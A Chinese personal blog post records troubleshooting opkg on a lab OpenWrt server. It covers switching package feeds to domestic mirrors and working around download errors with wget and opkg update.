+<h2 id="服务器play"><a href="#服务器play" class="headerlink" title="服务器play"></a>服务器play</h2><h3 id="openwrt-centos7"><a href="#openwrt-centos7" class="headerlink" title="openwrt centos7"></a>openwrt centos7</h3><h4 id="opkg-命令安装"><a href="#opkg-命令安装" class="headerlink" title="opkg 命令安装"></a>opkg 命令安装</h4><p>稍微记一下自己对服务器的一些操作，用的是实验室的服务器,上来想装个docker，结果发现什么都没有</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514162413.png" alt="20240514162413"></p>
+<p>然后因为root账户<code>ftp</code>也是没办法使用的</p>
+<p>什么都没有就只能使用<code>opkg</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514171411.png" alt="20240514171411"></p>
+<p>版本也是逆天的老,使用<code>opkg</code></p>
+<p><code>opkg install sudo</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514171912.png" alt="20240514171912"></p>
+<p>成功没连接上</p>
+<p>从备份文件中拷贝一份源仓库<br><code>cp /etc/opkg/distfeeds.conf /etc/opkg/distfeeds.conf.bak</code></p>
+<p><code>vi /etc/opkg/distfeeds.conf</code></p>
+<p>修改一下源文件<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514171848.png" alt="20240514171848"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514171833.png" alt="20240514171833"></p>
+<p>中科大</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">src/gz openwrt_core http://mirrors.ustc.edu.cn/openwrt/releases/22.03.5/targets/x86/64/packages</span><br><span class="line">src/gz openwrt_base http://mirrors.ustc.edu.cn/openwrt/releases/22.03.5/packages/x86_64/base</span><br><span class="line">src/gz openwrt_luci http://mirrors.ustc.edu.cn/openwrt/releases/22.03.5/packages/x86_64/luci</span><br><span class="line">src/gz openwrt_packages http://mirrors.ustc.edu.cn/openwrt/releases/22.03.5/packages/x86_64/packages</span><br><span class="line">src/gz openwrt_routing http://mirrors.ustc.edu.cn/openwrt/releases/22.03.5/packages/x86_64/routing</span><br><span class="line">src/gz openwrt_telephony http://mirrors.ustc.edu.cn/openwrt/releases/22.03.5/packages/x86_64/telephony</span><br></pre></td></tr></table></figure>
+
+<p>清华大学</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">src/gz openwrt_core https://mirrors.tuna.tsinghua.edu.cn/openwrt/releases/22.03.5/targets/x86/64/packages</span><br><span class="line">src/gz openwrt_base https://mirrors.tuna.tsinghua.edu.cn/openwrt/releases/22.03.5/packages/x86_64/base</span><br><span class="line">src/gz openwrt_luci https://mirrors.tuna.tsinghua.edu.cn/openwrt/releases/22.03.5/packages/x86_64/luci</span><br><span class="line">src/gz openwrt_packages https://mirrors.tuna.tsinghua.edu.cn/openwrt/releases/22.03.5/packages/x86_64/packages</span><br><span class="line">src/gz openwrt_routing https://mirrors.tuna.tsinghua.edu.cn/openwrt/releases/22.03.5/packages/x86_64/routing</span><br><span class="line">src/gz openwrt_telephony https://mirrors.tuna.tsinghua.edu.cn/openwrt/releases/22.03.5/packages/x86_64/telephony</span><br></pre></td></tr></table></figure>
+
+<p>阿里云</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">src/gz openwrt_core https://mirrors.aliyun.com/openwrt/releases/22.03.5/targets/x86/64/packages</span><br><span class="line">src/gz openwrt_base https://mirrors.aliyun.com/openwrt/releases/22.03.5/packages/x86_64/base</span><br><span class="line">src/gz openwrt_luci https://mirrors.aliyun.com/openwrt/releases/22.03.5/packages/x86_64/luci</span><br><span class="line">src/gz openwrt_packages https://mirrors.aliyun.com/openwrt/releases/22.03.5/packages/x86_64/packages</span><br><span class="line">src/gz openwrt_routing https://mirrors.aliyun.com/openwrt/releases/22.03.5/packages/x86_64/routing</span><br><span class="line">src/gz openwrt_telephony https://mirrors.aliyun.com/openwrt/releases/22.03.5/packages/x86_64/telephony</span><br></pre></td></tr></table></figure>
+
+<p>腾讯云</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">src/gz openwrt_core https://mirrors.cloud.tencent.com/openwrt/releases/22.03.5/targets/x86/64/packages</span><br><span class="line">src/gz openwrt_base https://mirrors.cloud.tencent.com/openwrt/releases/22.03.5/packages/x86_64/base</span><br><span class="line">src/gz openwrt_luci https://mirrors.cloud.tencent.com/openwrt/releases/22.03.5/packages/x86_64/luci</span><br><span class="line">src/gz openwrt_packages https://mirrors.cloud.tencent.com/openwrt/releases/22.03.5/packages/x86_64/packages</span><br><span class="line">src/gz openwrt_routing https://mirrors.cloud.tencent.com/openwrt/releases/22.03.5/packages/x86_64/routing</span><br><span class="line">src/gz openwrt_telephony https://mirrors.cloud.tencent.com/openwrt/releases/22.03.5/packages/x86_64/telephony</span><br></pre></td></tr></table></figure>
+
+<p><code>opkg install sudo</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514180715.png" alt="20240514180715"></p>
+<p>依旧安装不成功</p>
+<p>感觉是没更新成功<br><code>opkg update</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514181419.png" alt="20240514181419"><br>一直报错网络有问题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514182440.png" alt="20240514182440"><br>后面看到一个老外给了解决方案，说是因为ssl证书有问题，需要先修改为http去安装新的证书，然后再改回https</p>
+<p>再次去搜索<br><code>Failed to send request: Operation not permitted</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514184051.png" alt="20240514184051"></p>
+<p>说可以利用wget去获取安装包</p>
+<p><code>wget -4 http://mirrors.ustc.edu.cn/openwrt/releases/22.03.5/packages/x86_64/base/Packages.gz</code></p>
+<p>去拉取失败的安装包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514184159.png" alt="20240514184159"></p>
+<p>好家伙真的可以</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514184306.png" alt="20240514184306"></p>
+<p>但是又说我另外一个没有安装成功的包已经存在</p>
+<p>然后我新建了一个文件夹，进入文件夹，重新更新</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514190757.png" alt="20240514190757"></p>
+<p>有一个这个<br><code> opkg_download: Failed to download http://mirrors.ustc.edu.cn/openwrt/releases/22.03.5/packages/x86_64/base/Packages.gz, wget returned 4.</code></p>
+<p>ipv4拉取<br><code>wget -4  http://mirrors.ustc.edu.cn/openwrt/releases/22.03.5/packages/x86_64/base/Packages.gz</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514191007.png" alt="20240514191007"><br>说是安装成功</p>
+<p>终于把opkg安装完成了</p>
+<p>还遇上一个坑<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514191701.png" alt="20240514191701"></p>
+<p>因为文件存在所以导致wget拉取不了</p>
+<p>修改文件名<code>mv Packages.gz Packages1.gz</code></p>
+<p>再拉取，再更新<br><code>wget -4 http://mirrors.ustc.edu.cn/openwrt/releases/22.03.5/packages/x86_64/base/Packages.gz</code></p>
+<p><code>opkg update</code></p>
+<p>只能说真的非常不好用</p>
+<h4 id="图形化软件包安装"><a href="#图形化软件包安装" class="headerlink" title="图形化软件包安装"></a>图形化软件包安装</h4><p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240514193151.png" alt="20240514193151"></p>
 
                 
                 <p class="end">__END__</p>
